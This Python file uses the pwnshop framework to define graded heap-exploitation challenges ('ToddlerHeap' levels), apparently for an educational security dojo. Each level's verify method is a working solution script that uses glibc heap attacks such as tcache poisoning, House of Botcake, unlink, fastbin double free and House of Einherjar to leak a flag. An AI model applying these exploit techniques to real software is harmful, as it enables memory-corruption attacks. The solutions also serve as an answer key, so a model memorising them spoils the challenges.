import pwnshop
import ctypes
import pwn

PWNSHOP_AUTOREGISTER = False

from pwnshop import Challenge, retry

def malloc_usable_size(size):
    if size <= 8:
        size = 9
    return size + ((8 - size) % 16)

class ToddlerHeapBase(Challenge):
    BUILD_IMAGE = "ubuntu:22.04"
    TEMPLATE_PATH = "toddlerheap/toddlerheap.c"
    PIE = True
    num_allocations = 16
    null_on_free = True
    malloc_flag_at_start = False
    read_flag_to_bss = False
    large_flag_buffer = False
    dont_puts_0_size = False
    dont_puts_0s = False
    num_flag_buffer_allocs = 1
    secret_size = 0
    functions = ["calloc", "malloc", "free", "puts", "read_flag", "quit"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        if self.large_flag_buffer:
            # ie: Make sure tcache won't be used
            self.flag_buffer_size = self.random.randrange(0x420, 0x600)
        else:
            self.flag_buffer_size = self.random.randrange(128, 1000)

        self.functions_description = "/".join(self.functions)

        if "stack_malloc_win" in self.functions:
            self.stack_malloc_win_size = self.random.randrange(0x21, 0x80)
            self.stack_malloc_win_size_usable = malloc_usable_size(self.stack_malloc_win_size)

    def mangle(self, addr, value):
     return (addr >> 12) ^ value

    # Note: only works for heap values on a happy list
    def demangle(self, obfus_ptr):
     o2 = (obfus_ptr >> 12) ^ obfus_ptr
     return (o2 >> 24) ^ o2

    def fill_tcache(self, p, s, n):
        for i in range(n):
            p.sendline(f"malloc {i} {s}".encode())
        for i in range(n):
            p.sendline(f"free {i}".encode())

class ToddlerHeapExample(ToddlerHeapBase):
    large_flag_buffer = True
    null_on_free = False
    functions = ["malloc", "calloc", "free", "puts", "read_flag", "quit", "safe_read"]

    def verify(self, **kwargs):
        return True

class ToddlerHeapBotcake(ToddlerHeapBase):
    PIE = False
    null_on_free = False
    zero_size_on_free = True
    dont_puts_0_size = True
    max_alloc_size =  0x400 # tcache
    functions = ["malloc", "free", "puts", "safer_read", "send_flag", "quit"]

    def verify(self, **kwargs):
        with self.run_challenge(**kwargs) as p:
            def demangle(ptr):
                mid = ptr ^ (ptr >> 12)
                return mid ^ (mid >> 24)

            def mangle(addr, ptr):
                return (addr >> 12) ^ ptr

            sz = 0x100

            # fill tcache
            for i in range(10):
                p.sendline(f"malloc {i}  {sz}")

            for i in range(7):
                p.sendline(f"free {i}")

            p.sendline(f"free 8") # victim
            p.sendline(f"free 7") # prev
            # consolidation in unsorted bin
            p.sendline(f"malloc 14 {sz}")
            p.sendline(f"free 8") # double free

            # overlapping chunk /w head of tcache from unsorted
            p.sendline(f"malloc 15 {sz * 2+ 0x10}")

            p.sendline("safer_read 15")
            p.sendline(b'a' * 0x10f + b'b')
            p.sendline("puts 15")
            print(p.recvuntil(b'aaaaab').decode('l1'))
            heap_leak = demangle(pwn.u64(p.recv(4).ljust(8, b'\x00')))
            print(f"{heap_leak=:x}")
            heap_base = heap_leak & ~0xFFF
            target = mangle(heap_base, p.elf.symbols['authenticated'])

            p.sendline("safer_read 15")
            p.sendline(b'a' * 0x108 + pwn.p64(sz + 0x10) + pwn.p64(target))
            p.sendline(f"malloc 0 {sz}")

            p.sendline(f"malloc 0 {sz}")
            p.sendline("safer_read 0")
            p.sendline(b"a" * 16)
            p.sendline("send_flag")
            p.sendline("quit")

            assert self.flag in p.recvall()


class ToddlerHeapLevel1(ToddlerHeapBase):
    #"Leverage consolidation and use after free to obtain the flag."

    # TLDR consolidation happens
    large_flag_buffer = True
    max_alloc_size = 0x400
    null_on_free = False
    functions = ["malloc", "free", "puts", "read_flag", "quit"]

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as process:
            self.fill_tcache(process, 64, 8)
            for operation in [
                "read_flag",
                "puts 7",
                "quit",
            ]:
                process.sendline(operation)
            assert self.flag in process.readall()

class ToddlerHeapLevel2(ToddlerHeapBase):
    #"Leverage Consolidation and use after free to obtain the flag."

    # TLDR match a large flag malloc using small mallocs
    large_flag_buffer = True
    max_alloc_size = 0x420
    null_on_free = False
    num_flag_buffer_allocs = 2
    functions = ["malloc", "calloc", "read_flag", "free", "puts", "quit"]

    def verify(self, **kwargs):
        """
        TBD
        """
        def run_test(p, mod_val):
            for i in range(7):
                p.sendline(f"malloc {i} 1000")
            for i in range(7):
                p.sendline(f"free {i}")
            for i in range(7):
                p.sendline(f"malloc {i} {mod_val}")
            for i in range(7):
                p.sendline(f"free {i}")

            p.sendline("calloc 1 1000")
            p.sendline(f"calloc 2 {mod_val}")
            p.sendline("calloc 3 1000")
            p.sendline("free 1")
            p.sendline("free 2")
            p.sendline("free 3")
            p.sendline("read_flag")
            p.clean()
            p.sendline("puts 3")
            return p.clean()

        with self.run_challenge(**kwargs) as p:
            mod_val = self.flag_buffer_size % 1000
            out = run_test(pwn.process(p.executable), mod_val)
            out +=run_test(pwn.process(p.executable), mod_val - 0x10)
            assert self.flag in out

class ToddlerHeapLevel3(ToddlerHeapBase):
    #"Leverage Consolidation and use after free to obtain the falg"

    # TLDR match a small flag malloc using large mallocs
    min_alloc_size = 0x420
    null_on_free = False
    functions = ["malloc", "read_flag", "free", "puts", "quit"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        # tcache mitigatation
        self.num_flag_buffer_allocs = self.random.randrange(7, 14)

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as p:
            sz = self.flag_buffer_size
            count = self.num_flag_buffer_allocs
            p.sendline("malloc 1 1056")
            p.sendline(f"malloc 2 {(count)* (sz)}")
            p.sendline("malloc 3 1056")
            p.sendline("malloc 4 1056")
            p.sendline("free 2")
            p.sendline("free 3")
            p.sendline("read_flag")
            print(p.clean().decode())
            p.sendline("quit")
            assert self.flag in p.recvall()

class ToddlerHeapLevel4(ToddlerHeapBase):
    #"Large Bin Attack"

    min_alloc_size = 0xbb8
    null_on_free = False
    PIE = False
    functions = ["malloc", "safe_read", "free", "puts", "send_flag", "quit"]

    @retry(16)
    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as p:
            p.sendline("malloc 1 5088") # Initial small value
            p.sendline("malloc 2 5000") # guard
            p.sendline("malloc 3 5072") # Secondary smaller value
            p.sendline("malloc 4 5000") # guard
            p.sendline("free 1") # free initial value
            p.sendline("malloc 5 5104") # This causes initial to go unsorted -> large
            p.sendline("free 3") # Secondary value goes to unsorted

            # UAF - Overwrite initial bk_nextsize ptr with target - 0x20
            p.sendline(b"safe_read 1 " + b"a" * 0x18 + pwn.p64(0x4041c0 - 0x20)) #pwn.p64(p.elf.symbols['authenticated'] - 0x20))
            p.sendline("malloc 6 5104") # Secondary goes from unsorted -> large
            # This triggers the write
            p.clean()
            p.sendline("send_flag")
            p.sendline("quit")

            assert self.flag in p.readall()

class ToddlerHeapLevel5(ToddlerHeapBase):
    #"unlink attack"

    PIE = False
    RELRO = "full"

    num_contacts = 16
    large_flag_buffer = True
    null_on_free = True
    malloc_flag_at_start = True
    num_flag_buffer_allocs = -1 # random
    min_alloc_size = 0x420 # no tcache
    functions = ["malloc", "read", "free", "puts", "quit"]

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as p:
            p.recvuntil("into ")
            flag_addr = int(p.recvline()[:-2], 16)

            flag_malloc_size = self.flag_buffer_size

            p.sendline("malloc 0 1056")
            p.sendline("malloc 1 1056")

            # We can calculate malloc 1 addr from flag addr
            dist = 0x430

            allocations_addr = p.elf.symbols['alloc_struct'] + 256;

            payload = b'a' * 8
            # Fake Chunk
            payload += pwn.p64(0x421) #p[1] - size - 0x10 (fake chunk size)
            payload += pwn.p64(allocations_addr - 0x18) # p[2] fd - fake chunk fd
            payload += pwn.p64(allocations_addr - 0x10) # p[3] bk - fake chunk bk
            payload += pwn.p64(0)

            padding = dist - len(payload) - 0x10 # distance - 16 bytes to get to header begining
            payload += b'b' * padding

            # This should be overwriting the header value
            payload += pwn.p64(0x420) # Sets prev size to 0x420
            payload += pwn.p64(0x430) # Sets p2 size to 0x430 (which it was already) and prev in use to false

            p.sendline(f"read 0 {len(payload)}".encode())
            p.sendline(payload)

            p.sendline("free 1") # Triggers unlinking

            # Overwrite allocations[0] via allocations[0]
            p.sendline("read 0 32")
            p.sendline(b'a' * 24 + pwn.p64(flag_addr))

            p.clean()
            p.sendline("puts 0")
            p.sendline('quit')
            assert self.flag in p.readall()

class ToddlerHeapLevel6(ToddlerHeapBase):
    #"fastbin double-free -> arb read"
    # Convenient write-global function to set size

    large_flag_buffer = True
    max_alloc_size = 0x18
    max_alloc_size = 0x18
    null_on_free = False

    # Reads flag at start
    read_flag_to_bss = True

    functions = ["calloc", "read_to_global", "safer_read", "free", "puts", "quit"]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.global_buff_size = self.random.randrange(128, 1000) // 8 * 8
        # Force a heap alignment problem
        if (self.global_buff_size // 8) % 2 == 0:
            self.global_buff_size += 8

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as p:

            p.recvuntil("into ")
            flag_addr = int(p.recvline()[:-2], 16)

            # Fill tcache
            for _ in range(7):
                p.sendline("calloc 1 8")
                p.sendline("free 1")

            # get a heap leak
            p.clean()
            p.sendline("puts 1")
            p.recvuntil("Data: ")
            mangled_heap_leak = pwn.u64(p.recvline()[:-1].ljust(8, b'\x00'))
            heap_addr = self.demangle(mangled_heap_leak)
            mangled_flag_addr = self.mangle(heap_addr,flag_addr - 0x28)

            for operation in [
                f"read_to_global {self.global_buff_size}",
                pwn.p64(0x20) * (self.global_buff_size // 8 - 1) + b'a' * 8,
                "calloc 1 24",
                "calloc 2 24",
                "free 1",
                "free 2",
                "free 1",
                "calloc 1 24",
                "calloc 2 24",
            ]:
                p.sendline(operation)


            for operation in [
                "safer_read 1",
                pwn.p64(mangled_flag_addr) + b'a' * 16,
            ]:
                p.sendline(operation)

            p.sendline("calloc 1 24")

            p.sendline("calloc 1 24")
            p.sendline("safer_read 1")
            p.sendline("a" * 24)
            p.sendline("puts 1")
            p.sendline("quit")
            assert self.flag in p.readall()

class ToddlerHeapLevel7(ToddlerHeapBase):
    #"fastbin double-free -> arb read"
    # size req can be met via size array
    large_flag_buffer = True
    max_alloc_size = 0x30
    null_on_free = False

    # Reads flag immediately after allocations array
    read_flag_to_bss = True

    functions = ["calloc", "safer_read", "free", "puts", "quit"]

    def __init__(self, *args, **kwargs):
        # num_allocations shifts flag buffer,
        # must ensure flag_buffer is at an 0x08 offset
        super().__init__(*args, **kwargs)
        self.num_allocations = 18 #+ self.random.randrange(4, 32)
        self.num_allocations -= self.num_allocations % 4
        self.num_allocations += 2

    def verify(self, **kwargs):
        """
        TBD
        """
        with self.run_challenge(**kwargs) as p:
            sz = 24
            p.recvuntil("into ")
            flag_addr = int(p.recvline()[:-2], 16)

            # Fill tcache
            for i in range(7):
                p.sendline(f"calloc 1 {sz}")
                p.sendline("free 1")

            # get a heap leak
            p.clean()
            p.sendline("puts 1")
            p.recvuntil("Data: ")
            mangled_heap_leak = pwn.u64(p.recvline()[:-1].ljust(8, b'\x00'))
            heap_addr = self.demangle(mangled_heap_leak)
            mangled_flag_addr = self.mangle(heap_addr,flag_addr - 0x10)
            mangled_null_me_addr = self.mangle(heap_addr,flag_addr - 0x10 - 0x18)

            for operation in [
                f"calloc 1 {sz}",
                f"calloc 2 {sz}",
                f"free 1",
                f"free 2",
                f"free 1",
                f"calloc 1 {sz}",
                f"calloc 2 {sz}",
            ]:
                p.sendline(operation)

            for operation in [
                "safer_read 1",
                #pwn.p64(mangled_flag_addr) + b'a' * 16,
                pwn.p64(mangled_null_me_addr) + b'a' * 16,
            ]:
                p.sendline(operation)
            p.clean()
            print(f"flag_addr {hex(flag_addr)}")
            print(f"heap_addr {hex(heap_addr)}")
            print(f"heap_mang {hex(mangled_heap_leak)}")

            # 8 so there is non-flag memory for calloc to clear
            p.sendline(f"calloc {self.num_allocations - 8} 32")
            p.sendline(f"calloc 1 {sz}")

            p.sendline(f"calloc 1 {sz}")
            p.sendline("safer_read 1")
            p.sendline("a" * 24)
            p.sendline("puts 1")
            p.sendline("quit")
            assert self.flag in p.readall()

class ToddlerHeapLevel8(ToddlerHeapBase):
    #"House of Enherjar

    PIE = True
    RELRO = "full"

    num_contacts = 16
    large_flag_buffer = True
    null_on_free = True
    dont_puts_0s = True
    max_alloc_size = 0x1000 # Just to cap a stack buffer size
    functions = ["malloc", "read_copy", "read_flag", "free", "puts", "quit"]

    def verify(self, **kwargs):
        """
        TBD
        """

        # TODO: figure out why some iterations of this segfault in libc
        with self.run_challenge(**kwargs) as p:
            p.sendline(f"malloc 1 8")
            p.sendline(f"malloc 2 8")
            p.sendline(f"free 1")
            p.sendline(f"free 2")
            p.sendline(f"malloc 1 8")
            p.clean()
            p.sendline(f"puts 1")
            p.recvuntil("Data: ")
            heap_leak = self.demangle(pwn.u64(p.recvline()[:-1].ljust(8, b'\x00')))
            print(f"leak: {hex(heap_leak)}")
            p.sendline(f"free 1")

            flag_malloc_size = self.flag_buffer_size

            malloc_sz = 2072 # note: 8
            m2_sz = 0x5f0
            p.sendline(f"malloc 0 {malloc_sz}")
            p.sendline(f"malloc 1 {m2_sz}")
            p.sendline(f"malloc 2 {malloc_sz}")
            p.sendline(f"malloc 3 {m2_sz}")
            p.clean()

            # We can calculate malloc 0 addr from flag addr
            dist = 0x28

            fake_chunk_addr = heap_leak + dist + 8 + 0x20

            print(f"leak: {hex(heap_leak)}")
            print(f"fake_chunk_addr: {hex(fake_chunk_addr)}")

            # off-by-one null termination on read
            # overwrite size lsb to backwards consolidate
            # Fake Chunk
            payload = b'a' * 0x18
            payload += pwn.p64(malloc_sz - 0x18 + 1) #p[1] - size - 0x10 (fake chunk size)
            payload += pwn.p64(fake_chunk_addr)
            payload += pwn.p64(fake_chunk_addr)
            payload += pwn.p64(fake_chunk_addr)
            payload += pwn.p64(fake_chunk_addr)
            payload = payload.ljust(malloc_sz - 8, b'a')
            payload += pwn.p64(malloc_sz - 0x18) # Overwrite prev size to point to fake chunk

            p.sendline(f"read_copy 0")
            p.sendline(payload)
            p.clean()

            p.sendline("free 1") # Triggers backward consolidation to free chunk

            p.sendline(f"malloc 4 {self.flag_buffer_size}")

            # rewrite fake_chunk to match
            payload = b'a' * 0x18
            payload += pwn.p64(0x30 + m2_sz + (malloc_sz - 0x18) * 2) # Overwrite size to match new "next" chunk
            payload += pwn.p64(fake_chunk_addr)
            payload += pwn.p64(fake_chunk_addr)
            payload += pwn.p64(fake_chunk_addr)
            payload += pwn.p64(fake_chunk_addr)
            p.sendline("read_copy 0")
            p.sendline(payload)

            # Second reference to fake chunk
            payload = b""
            payload = payload.ljust(malloc_sz - 8, b'a')
            payload += pwn.p64(0x30 + m2_sz + (malloc_sz - 0x18) * 2) # Overwrite prev size to point to fake chunk

            p.sendline(f"read_copy 2")
            p.sendline(payload)
            p.sendline("free 3") # Triggers backward consolidation to free chunk

            # Malloc twice to consume a binned chunk
            p.sendline("read_flag")
            p.sendline("read_flag")
            p.clean()
            p.sendline("puts 4")
            p.sendline('quit')
            assert self.flag in p.readall()

# Note: level numbering is order created / live dojo-id,
# Display dojo in module is different
# Dojo order should be as shown below (increasing in difficulty)
# EASIER: 1, 2, 3, 6, 7,
# HARDER 4, 5, 8
LEVELS = [
    ToddlerHeapLevel1,
    ToddlerHeapLevel2,
    ToddlerHeapLevel3,
    ToddlerHeapLevel4,
    ToddlerHeapLevel5,
    ToddlerHeapLevel6,
    ToddlerHeapLevel7,
    ToddlerHeapLevel8,
    ToddlerHeapExample,
    ToddlerHeapBotcake
]


NUM_TESTING=1
DOJO_MODULE="heap"
pwnshop.register_challenges(LEVELS)
